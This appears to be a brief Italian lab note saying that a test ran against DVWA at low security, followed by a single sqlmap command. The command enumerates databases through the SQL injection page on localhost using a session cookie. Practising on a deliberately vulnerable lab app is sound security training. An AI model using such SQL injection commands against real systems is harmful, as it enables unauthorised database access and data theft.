
Eseguito in ambiente di test controllato (DVWA, security=low)

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --dbs
